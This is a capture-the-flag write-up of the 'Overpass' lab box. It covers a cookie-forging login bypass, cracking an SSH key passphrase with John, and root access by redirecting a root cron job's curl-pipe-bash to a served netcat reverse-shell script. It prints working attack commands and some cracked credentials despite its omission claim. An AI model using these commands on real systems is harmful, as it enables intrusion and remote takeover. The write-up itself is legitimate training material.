## Description
_Passwords, cracked hashes, and flags have been omitted from this writeup per platform guidelines._

```Description
What happens when some broke CompSci students make a password manager?
```

## IP- Address
```IP-Address
10.49.157.33
```

## RustScan
```bash
└─$ rustscan -a 10.49.157.33  -b 450 -t 2000 --ulimit 5000 -- -e tun0  -p80
[~] Automatically increasing ulimit value to 5000.
Open 10.49.157.33:22
Open 10.49.157.33:80
```

## Web-Interface
```bash

<!DOCTYPE html>
<html>

<head>
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <title>Overpass</title>
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <link rel="stylesheet" type="text/css" media="screen" href="/css/main.css">
    <link rel="icon" type="image/png" href="/img/overpass.png" />
    <script src="/main.js"></script>
</head>

<body>
    <nav>
        <img class="logo" src="/img/overpass.svg" alt="Overpass logo">
        <h2 class="navTitle"><a href="/">Overpass</a></h2>
        <a href="/aboutus">About Us</a>
        <a href="/downloads">Downloads</a>
    </nav>
    <h1 class="pageHeading content">Welcome to Overpass</h1>
    <h3 class="subtitle content">A secure password manager with support for Windows, Linux, MacOS and more</h3>
    <div class="bodyFlexContainer content">
        <div>
            <img id="lockImg" src="/img/jose-fontano-pZld9PiPDno-unsplash.jpg">
            <div>Photo by <a
                    href="https://unsplash.com/@josenothose?utm_source=unsplash&amp;utm_medium=referral&amp;utm_content=creditCopyText">Jose
                    Fontano</a> on <a
                    href="https://unsplash.com/s/photos/lock?utm_source=unsplash&amp;utm_medium=referral&amp;utm_content=creditCopyText">Unsplash</a>
            </div>
        </div>
        <div>
            <p>People reuse the same password for multiple services. If you are one of them, you're
                risking your accounts being hacked by evil hackers.
            </p>
            <p>Overpass allows you to securely store different
                passwords for every service, protected using military grade
                <!--Yeah right, just because the Romans used it doesn't make it military grade, change this?-->
                cryptography to keep you safe.
            </p>
            <h4>Reasons to use Overpass</h4>
            <ul>
                <li>Your passwords are never transmitted over the internet, in any form, unlike other password managers.
                </li>
                <li>Your passwords are protected using Military Grade encryption.</li>
                <li>Overpass do not store your passwords, unlike other password managers.</li>
            </ul>
            <p>Download Overpass today and start keeping your passwords safe. <a href="/downloads">Downloads</a></p>
        </div>
    </div>
</body>
</html>
```

## Gobuster
```bash
┌──(kali㉿kali)-[~]
└─$ gobuster dir -u http://10.49.157.33 \
-w /usr/share/wordlists/dirb/common.txt \
-x php,js,txt,html,zip,bak,backup,old \
-t 70

===============================================================
/404.html             (Status: 200) [Size: 782]
/aboutus              (Status: 301) [Size: 0] [--> aboutus/]
/admin                (Status: 301) [Size: 42] [--> /admin/]
/admin.html           (Status: 200) [Size: 1525]
/cookie.js            (Status: 200) [Size: 1502]
/css                  (Status: 301) [Size: 0] [--> css/]
/downloads            (Status: 301) [Size: 0] [--> downloads/]
/img                  (Status: 301) [Size: 0] [--> img/]
/index.html           (Status: 301) [Size: 0] [--> ./]
/index.html           (Status: 301) [Size: 0] [--> ./]
/login.js             (Status: 200) [Size: 1779]
/main.js              (Status: 200) [Size: 28]
Progress: 41517 / 41517 (100.00%)
===============================================================
Finished
=====================
```

Lets Analyze `Login.js`
a broken authentication 
```html
async function postData(url = '', data = {}) {
    // Default options are marked with *
    const response = await fetch(url, {
        method: 'POST', // *GET, POST, PUT, DELETE, etc.
        cache: 'no-cache', // *default, no-cache, reload, force-cache, only-if-cached
        credentials: 'same-origin', // include, *same-origin, omit
        headers: {
            'Content-Type': 'application/x-www-form-urlencoded'
        },
        redirect: 'follow', // manual, *follow, error
        referrerPolicy: 'no-referrer', // no-referrer, *client
        body: encodeFormData(data) // body data type must match "Content-Type" header
    });
    return response; // We don't always want JSON back
}
const encodeFormData = (data) => {
    return Object.keys(data)
        .map(key => encodeURIComponent(key) + '=' + encodeURIComponent(data[key]))
        .join('&');
}
function onLoad() {
    document.querySelector("#loginForm").addEventListener("submit", function (event) {
        //on pressing enter
        event.preventDefault()
        login()
    });
}
async function login() {
    const usernameBox = document.querySelector("#username");
    const passwordBox = document.querySelector("#password");
    const loginStatus = document.querySelector("#loginStatus");
    loginStatus.textContent = ""
    const creds = { username: usernameBox.value, password: passwordBox.value }
    const response = await postData("/api/login", creds)
    const statusOrCookie = await response.text()
    if (statusOrCookie === "Incorrect credentials") {
        loginStatus.textContent = "Incorrect Credentials"
        passwordBox.value=""
    } else {
        Cookies.set("SessionToken",statusOrCookie)
        window.location = "/admin"
    }
}   
```

With this broken authentication I open the `Brave` inspect and checked the cookies and add an entry
```Cookiee Entry
SessionToken = 3
```
After than visit to the webpage
```Web 
http://10.49.157.33/admin/
```

Got the James `SSH` Private Key
```id_rsa
-----BEGIN RSA PRIVATE KEY-----
[private key omitted]
-----END RSA PRIVATE KEY-----
```

Its an Private key
```bash
└─$ file id_rsa.enc    
id_rsa.enc: PEM RSA private key
```

We need to decrypt the secret code here for that first 
```bash
─$ python3 /usr/share/john/ssh2john.py id_rsa.enc > id_rsa.hashs
```

## John 
```bash
$ john id_rsa.hash -w=/usr/share/wordlists/rockyou.txt
Using default input encoding: UTF-8
Loaded 1 password hash (SSH, SSH private key [RSA/DSA/EC/OPENSSH 32/64])
Cost 1 (KDF/cipher [0=MD5/AES 1=MD5/3DES 2=Bcrypt/AES]) is 0 for all loaded hashes
Cost 2 (iteration count) is 1 for all loaded hashes
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
james13          (id_rsa.enc)     
1g 0:00:00:00 DONE (2025-11-29 16:29) 100.0g/s 1337Kp/s 1337Kc/s 1337KC/s pink25..honolulu
Use the "--show" option to display all of the cracked passwords reliably
Session completed. 
```

Got the Secret Code `james13` 

## SSH

```bash
─$ ssh -i id_rsa james@10.49.157.33
Enter passphrase for key 'id_rsa': james13
```

## User Flag
```Flag
james@ip-10-49-157-33:~$ cat user.txt
[flag omitted]
```

## Privilege Escalation
```bash
james@ip-10-49-157-33:~$ cat todo.txt
To Do:
> Update Overpass' Encryption, Muirland has been complaining that it's not strong enough
> Write down my password somewhere on a sticky note so that I don't forget it.
  Wait, we make a password manager. Why don't I just use that?
> Test Overpass for macOS, it builds fine but I'm not sure it actually works
> Ask Paradox how he got the automated build script working and where the builds go.
  They're not updating on the website
```

Lets Search for the password manager
which we found in `/usr/bin/overpass`
```bash
james@ip-10-49-157-33:/usr/bin$ ./overpass
Welcome to Overpass
Options:
1 Retrieve Password For Service
2 Set or Update Password For Service
3 Delete Password For Service
4 Retrieve All Passwords
5 Exit
Choose an option: 4
System   saydrawnlyingpicture
james@ip-10-49-157-33:/usr/bin$ 
```

Got Another Credentials
```bash
James   saydrawnlyingpicture
```

## CronJob
Lets check for cronjobs
```bash
james@ip-10-49-157-33:~$ cat /etc/crontab
# /etc/crontab: system-wide crontab
# Unlike any other crontab you don't have to run the `crontab'
# command to install the new version when you edit this file
# and files in /etc/cron.d. These files also have username fields,
# that none of the other crontabs do.

SHELL=/bin/sh
PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin

# m h dom mon dow user command
17 * * * * root    cd / && run-parts --report /etc/cron.hourly
25 6 * * * root test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )
47 6 * * 7 root test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.weekly )
52 6 1 * * root test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly )
# Update builds from latest code
* * * * * root curl overpass.thm/downloads/src/buildscript.sh | bash
james@ip-10-49-157-33:~$ 
```
Suspecious
```bash
* * * * * root curl overpass.thm/downloads/src/buildscript.sh | bash
```

## Analyses
After seeing curl command web thought to change the `overpass.thm` IP in `etc/hosts` so that it redirect on over tunnel server and get the buildscript.sh from over server which will be a reverse-shell

## Implementation
```bash
james@ip-10-49-157-33:~$ cat /etc/hosts
127.0.0.1 localhost                                                                
127.0.1.1 overpass-prod                                                            
192.168.142.60 overpass.thm                                                        
# The following lines are desirable for IPv6 capable hosts                         
::1     ip6-localhost ip6-loopback                                                 
fe00::0 ip6-localnet                                                               
ff00::0 ip6-mcastprefix                                                            
ff02::1 ip6-allnodes                                                               
ff02::2 ip6-allrouters
```

On Our Local Kali Machine
```bash
mkdir downloads
mkdir downloads/src
echo "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.142.60 1234 >/tmp/f" > downloads/src/buildscript.sh
```

## Run Python Server on Kali
```bash
─$ sudo python3 -m http.server 80
[sudo] password for kali: 
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
10.49.157.33 - - [29/Nov/2025 16:53:02] "GET /downloads/src/buildscript.sh HTTP/1.1" 200 -
10.49.157.33 - - [29/Nov/2025 16:54:02] "GET /downloads/src/buildscript.sh HTTP/1.1" 200 -
10.49.157.33 - - [29/Nov/2025 16:55:02] "GET /downloads/src/buildscript.sh HTTP/1.1" 200 -
10.49.157.33 - - [29/Nov/2025 16:56:02] "GET /downloads/src/buildscript.sh HTTP/1.1" 200 -
10.49.157.33 - - [29/Nov/2025 16:57:01] "GET /downloads/src/buildscript.sh HTTP/1.1" 200 -
^C
Keyboard interrupt received, exiting.
```

## Netcat
run Netcat on the same time in different panel
```bash
└─$ nc -lvnp 1234
listening on [any] 1234 ...
connect to [192.168.142.60] from (UNKNOWN) [10.49.157.33] 46656
/bin/sh: 0: can't access tty; job control turned off
# ls
buildStatus
builds
go
root.txt
src
# cat root.txt
[flag omitted]
```

Got the Root Flag

## Root Flag

```Flag
[flag omitted]
```
